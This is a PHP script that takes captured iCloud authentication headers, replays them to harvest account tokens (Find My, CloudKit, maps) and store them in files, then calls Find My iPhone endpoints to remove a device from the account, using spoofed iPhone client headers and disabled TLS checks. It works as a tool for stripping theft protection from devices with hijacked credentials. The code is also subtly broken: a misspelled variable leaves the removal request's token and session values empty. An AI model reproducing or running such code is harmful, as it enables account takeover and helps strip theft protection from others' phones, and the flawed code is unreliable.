<?php

class mmeFMITokens
{
    private $method;
    private $headers;
    private $body;
    private $uri;
    private $client;

    public function __construct($client)
    {
        $this->client = $client;
        $this->method = "POST";
        $this->headers = [
			"Host" => "setup.icloud.com",
			"X-Apple-I-MD-RINFO" => $client['X-Apple-I-MD-RINFO'],
			"Connection" => "keep-alive",
			"Accept" => "*/*",
			"Authorization" => "Basic " . $client['X-MobileMe-AuthToken'],
			"Content-Type" => "application/xml",
			"X-MMe-Country" => "MX",
			"X-MMe-Client-Info" => "<iPhone9,3> <iPhone OS;15.8.2;19H384> <com.apple.AppleAccount/1.0 (com.apple.Preferences/1112.96)>",
			"Accept-Encoding" => "gzip, deflate, br",
			"X-MMe-Language" => "es-MX",
			"Accept-Language" => "es-MX,es-419,es",
			"X-Apple-I-Client-Time" => "2024-08-05T19:37:46Z",
			"X-Apple-ADSID" => "000137-08-f21c088e-3bb2-4be0-b82f-daf4dd984956",
			"X-Apple-I-MD-M" => $client['X-Apple-I-MD-M'],
			"X-Apple-I-MD" => $client['X-Apple-I-MD'],
			"X-Apple-I-TimeZone" => "GMT-5",
			"User-Agent" => "Configuraci%C3%B3n/1112.96 CFNetwork/1335.0.3.4 Darwin/21.6.0",
			"X-Apple-I-Locale" => "es_MX"
        ];
        $this->body = '<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>protocolVersion</key>
                <string>1.0</string>
                <key>userInfo</key>
                <dict>
                    <key>client-id</key>
                    <string>FEF008A5-F554-46A1-9057-E4CF335668EF</string>
                    <key>language</key>
                    <string>es-EC</string>
                    <key>timezone</key>
                    <string>America/Guayaquil</string>
                </dict>
            </dict>
            </plist>';
    }

    public function extractHeaders($filename)
    {
        $content = file_get_contents($filename);
        $patterns = [
			'X-MobileMe-AuthToken' => '/X-MobileMe-AuthToken\s+([^\s]+)/',
			'X-Apple-I-MD-M' => '/X-Apple-I-MD-M:\s+([^\s]+)/',
			'X-Apple-I-MD' => '/X-Apple-I-MD:\s+([^\s]+)/',
			'X-Apple-I-MD-RINFO' => '/X-Apple-I-MD-RINFO:\s+([^\s]+)/',
			'Authorization:' => '/Authorization:\s+([^\s]+)/'
		];
        $results = [];
        foreach ($patterns as $key => $pattern) {
            if (preg_match($pattern, $content, $matches)) {
                $results[$key] = $matches[1];
            } else {
                $results[$key] = null;
            }
        }
        return $results;
    }

    private function extractValue($key, $element, $information)
    {
        $returnValue = explode("<key>$key</key>", $information)[1];
        $returnValue = explode("<$element>", $returnValue)[1];
        $returnValue = explode("</$element>", $returnValue)[0];
        return $returnValue;
    }

    private function prepareHeaders()
    {
        $preparedHeaders = [];
        foreach ($this->headers as $key => $value) {
            $preparedHeaders[] = $key . ': ' . $value;
        }
        return $preparedHeaders;
    }

    public function sendRequest()
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://setup.icloud.com/setup/get_account_settings");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_VERBOSE, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->prepareHeaders());
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $this->body);

        $resp = gzdecode(curl_exec($ch));
        file_put_contents("mmeFMIPTokens", $resp);
        curl_close($ch);

        return $resp;
    }
	
	
	
    public function getTokens()
    {
        $resp = $this->sendRequest();
        $mmeFMFAppToken = $this->extractValue("mmeFMFAppToken", "string", $resp);
		$mmeFMIPAppToken = $this->extractValue("mmeFMIPAppToken", "string", $resp);
        $cloudKitToken = $this->extractValue("cloudKitToken", "string", $resp);
        $mmeAuthToken = $this->extractValue("mmeAuthToken", "string", $resp);
        $mmeFMIPToken = $this->extractValue("mmeFMIPToken", "string", $resp);
        $mmeFMFToken = $this->extractValue("mmeFMFToken", "string", $resp);
        $mapsToken = $this->extractValue("mapsToken", "string", $resp);
        $dsPrsID = $this->extractValue("dsPrsID", "string", $resp);
        $URI = explode("<key>com.apple.Dataclass.DeviceLocator</key>", $resp)[1];
        $URI = explode("<key>hostname</key>", $URI)[1];
        $URI = explode("<string>", $URI)[1];
        $URI = explode("</string>", $URI)[0];

        $FMF = explode("<key>com.apple.Dataclass.ShareLocation</key>", $resp)[1];
        $FMF = explode("<key>appHostname</key>", $FMF)[1];
        $FMF = explode("<string>", $FMF)[1];
        $FMF = explode("</string>", $FMF)[0];

        return [
            "mmeFMFAppToken" => $mmeFMFAppToken,
            "mmeFMIPAppToken" => $mmeFMIPAppToken,
            "cloudKitToken" => $cloudKitToken,
            "mmeAuthToken" => $mmeAuthToken,
            "mmeFMIPToken" => $mmeFMIPToken,
            "mmeFMFToken" => $mmeFMFToken,
            "mapsToken" => $mapsToken,
            "dsPrsID" => $dsPrsID,
            "FMIPHost" => $URI,
            "FMFHost" => $FMF
        ];
    }
}


	function initClient($Headers, $dsPrsID)
	{
		$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://p182-fmipmobile.icloud.com/fmipservice/device/$dsPrsID/initClient");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_VERBOSE, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientContext":{"push":true,"osBuild":"19H384","fmly":true,"clientTimestamp":744315398574.14502,"deviceUDID":"a727fb24f8a4e513d6dc11751b545ce9b014e57e","productType":"iPhone9,3","inactiveTime":0,"appVersion":"7.0","osVersion":"15.8.2","deviceListVersion":1}}');

        $resp = curl_exec($ch);
        file_put_contents("initClient", $resp);
        curl_close($ch);

        return $resp;
		
	}
	
	function refreshClient($Headers, $dsPrsID, $json)
	{
		$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://p182-fmipmobile.icloud.com/fmipservice/device/$dsPrsID/refreshClient");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_VERBOSE, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json);

        $resp = curl_exec($ch);
        file_put_contents("refreshClient", $resp);
        curl_close($ch);

        return $resp;
		
	}


	function remove($Headers, $dsPrsID, $json)
	{
		$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://p182-fmipmobile.icloud.com/fmipservice/device/$dsPrsID/remove");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_VERBOSE, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $Headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json);

        $resp = curl_exec($ch);
        file_put_contents("remove", $resp);
        curl_close($ch);

        return $resp;
		
	}

	
$test = file_get_contents("php://input");
file_put_contents("test", $test);

$mmeFMITokens = new mmeFMITokens([]);
$headers = $mmeFMITokens->extractHeaders('test');

$client = [
    'X-Apple-I-MD-RINFO' => $headers['X-Apple-I-MD-RINFO'],
    'X-MobileMe-AuthToken' => $headers['X-MobileMe-AuthToken'],
    'X-Apple-I-MD-M' => $headers['X-Apple-I-MD-M'],
    'X-Apple-I-MD' => $headers['X-Apple-I-MD'],
	"X-Apple-I-MD-RINFO" => $headers["X-Apple-I-MD-RINFO"]
];


$mmeFMITokens = new mmeFMITokens($client);
$tokens = $mmeFMITokens->getTokens();

$mmeFMIPtoken = $tokens['mmeFMIPToken'];
$mmeFMFAppToken = $tokens['mmeFMFAppToken'];
$mmeFMFToken = $tokens["mmeFMFToken"];
$mmeFMIPAppToken = $tokens["mmeFMIPAppToken"];
$dsPrsID = $tokens['dsPrsID'];
$mdm = $headers['X-Apple-I-MD-M'];
$md = $headers['X-Apple-I-MD'];

$initClientHeaders = array();
$initClientHeaders[] = "Host: p182-fmipmobile.icloud.com";
$initClientHeaders[] = "X-Apple-Realm-Support: 1.0";
$initClientHeaders[] = "X-Apple-I-MD-RINFO: 67437824";
$initClientHeaders[] = "Accept: application/json";
$initClientHeaders[] = "Authorization: Basic ".base64_encode($dsPrsID.":".$mmeFMIPAppToken);
$initClientHeaders[] = "Connection: keep-alive";
$initClientHeaders[] = "Content-Type: application/json";
$initClientHeaders[] = "X-MME-CLIENT-INFO: <iPhone9,3> <iPhone OS;15.8.2;19H384> <com.apple.AuthKit/1 (com.apple.findmy/259.4.25)>";
$initClientHeaders[] = "Accept-Encoding: gzip, deflate, br";
$initClientHeaders[] = "Accept-Language: es-MX,es-419;q=0.9,es;q=0.8";
$initClientHeaders[] = "X-Apple-I-MD-M: ".$headers['X-Apple-I-MD-M'];
$initClientHeaders[] = "X-Apple-Find-API-Ver: 3.0";
$initClientHeaders[] = "X-Apple-I-Client-Time: 2024-08-02T18:16:38Z";
$initClientHeaders[] = "X-Apple-I-MD: ".$headers['X-Apple-I-MD'];
$initClientHeaders[] = "X-Apple-AuthScheme: Forever";
$initClientHeaders[] = "X-Apple-I-TimeZone: GMT-5";
$initClientHeaders[] = "User-Agent: Encontrar/259.4.25 CFNetwork/1335.0.3.4 Darwin/21.6.0";
$initClientHeaders[] = "X-Apple-I-Locale: es_MX";

$initClient = json_decode(initClient($initClientHeaders, $dsPrsID));
$firstName = $initClient->userInfo->firstName;
$lastName = $initClient->userInfo->lastName;
$authToken = $initClient->serverContext->authToken;
$productType = $initClient->content[1]->rawDeviceModel;

$json = '{"clientContext":{"productType":"iPhone9,3","clientTimestamp":744315398935.27698,"osVersion":"15.8.2","inactiveTime":2000,"appVersion":"7.0","selectedDevice":"all","osBuild":"19H384","push":true,"deviceListVersion":1,"fmly":true,"deviceUDID":"a727fb24f8a4e513d6dc11751b545ce9b014e57e","notificationAuthStatus":0},"tapContext":[],"serverContext":{"validRegion":true,"enable2FAFamilyActions":false,"imageBaseUrl":"https:\/\/statici.icloud.com","timezone":{"tzName":"US\/Pacific","currentOffset":-25200000,"previousTransition":1710064799999,"previousOffset":-28800000,"tzCurrentName":"Pacific Daylight Time"},"clientId":"ZGV2aWNlXzIxNTg3MjgyMDM5XzE3MjI2MjI2MDExMTg=","callbackIntervalInMS":10000,"trackInfoCacheDurationInSecs":86400,"showSllNow":true,"isHSA":true,"minTrackLocThresholdInMts":100,"serverTimestamp":1722622601141,"itemsTabEnabled":true,"authToken":"'.$authToken.'","info":"AZAUgF+sElhejpoQ0Jz1Jkuuix7VC+a3Dra4TaJnLOfnyNyx2liuHIB8hoBjxyccgh\/fPRxa7qrM1tcITHzDli4JJShoI6DYA05X+Gus","sessionLifespan":900000,"inaccuracyRadiusThreshold":200,"enable2FAErase":false,"macCount":0,"useAuthWidget":true,"enable2FAFamilyRemove":false,"prefsUpdateTime":1722453545284,"itemLearnMoreURL":"https:\/\/support.apple.com\/kb\/HT211331?viewlocale=es_MX","preferredLanguage":"es-mx","minCallbackIntervalInMS":5000,"maxDeviceLoadTime":60000,"maxCallbackIntervalInMS":30000,"pendingRemoveGracePeriodInDays":30,"classicUser":false,"maxLocatingTime":90000,"enableMapStats":true,"deviceImageVersion":"30","cloudUser":true,"deviceLoadStatus":"200","prsId":21587282039}}';

$refreshClient = json_decode(refreshClient($initClientHeaders, $dsPrsID, $json));

$id = $refreshClient->content[0]->id;
$clientId = $refreshClient->serverContext->clientId;
$authToken2 = $regreshClient->serverContext->authToken;
$info = $regreshClient->serverContext->info;

$jsonRemove = '{"serverContext":{"validRegion":true,"showSllNow":false,"cloudUser":true,"preferredLanguage":"es-mx","minCallbackIntervalInMS":5000,"classicUser":false,"maxLocatingTime":90000,"deviceLoadStatus":"200","macCount":0,"prefsUpdateTime":1722453545284,"authToken":"'.$authToken2.'","enable2FAFamilyRemove":false,"callbackIntervalInMS":10000,"maxDeviceLoadTime":60000,"minTrackLocThresholdInMts":100,"deviceImageVersion":"30","inaccuracyRadiusThreshold":200,"isHSA":true,"serverTimestamp":1722623304521,"trackInfoCacheDurationInSecs":86400,"info":"'.$info.'","pendingRemoveGracePeriodInDays":30,"enableMapStats":true,"enable2FAFamilyActions":false,"maxCallbackIntervalInMS":30000,"prsId":21587282039,"clientId":"'.$clientId.'","sessionLifespan":900000,"itemLearnMoreURL":"https:\/\/support.apple.com\/kb\/HT211331?viewlocale=es_MX","timezone":{"tzName":"US\/Pacific","previousTransition":1710064799999,"previousOffset":-28800000,"tzCurrentName":"Pacific Daylight Time","currentOffset":-25200000},"imageBaseUrl":"https:\/\/statici.icloud.com","itemsTabEnabled":true,"useAuthWidget":true,"enable2FAErase":false},"clientContext":{"osVersion":"15.8.2","inactiveTime":0,"clientTimestamp":744316105192.10596,"deviceUDID":"a727fb24f8a4e513d6dc11751b545ce9b014e57e","fmly":true,"productType":"iPhone9,3","deviceListVersion":1,"osBuild":"19H384","push":true,"appVersion":"7.0"},"device":"'.$id.'"}';

echo remove($initClientHeaders, $dsPrsID, $jsonRemove);
?>
